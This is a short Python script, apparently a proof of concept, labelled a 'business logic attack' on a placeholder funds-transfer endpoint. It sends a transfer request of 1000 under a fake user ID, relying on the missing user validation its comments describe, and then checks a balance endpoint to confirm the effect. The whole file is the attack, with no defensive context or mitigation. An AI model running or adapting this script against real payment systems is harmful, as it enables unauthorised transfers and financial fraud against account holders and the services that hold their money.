import requests

# Target URL for vulnerable endpoint
TARGET_URL = 'http://vulnerable-website.com/transfer_funds'

# Example payloads
VALID_USER_ID = 'user123'
FAKE_USER_ID = 'fakeuser'
TRANSFER_AMOUNT = 1000

def perform_business_logic_attack():
    # Step 1: Exploit the business logic flaw to transfer funds
    # Assumes a flaw where user validation is not properly checked
    response = requests.post(TARGET_URL, json={
        'user_id': FAKE_USER_ID,
        'amount': TRANSFER_AMOUNT
    })
    
    if response.status_code == 200:
        print("Business logic attack successful.")
        print("Response:", response.json())
    else:
        print("Business logic attack failed.")
        print("Status Code:", response.status_code)
        print("Response:", response.text)

    # Step 2: Verify the impact of the attack by checking balances
    balance_response = requests.get(f'{TARGET_URL}/balance', params={'user_id': VALID_USER_ID})
    print(f"Balance after attack: {balance_response.json()}")

perform_business_logic_attack()
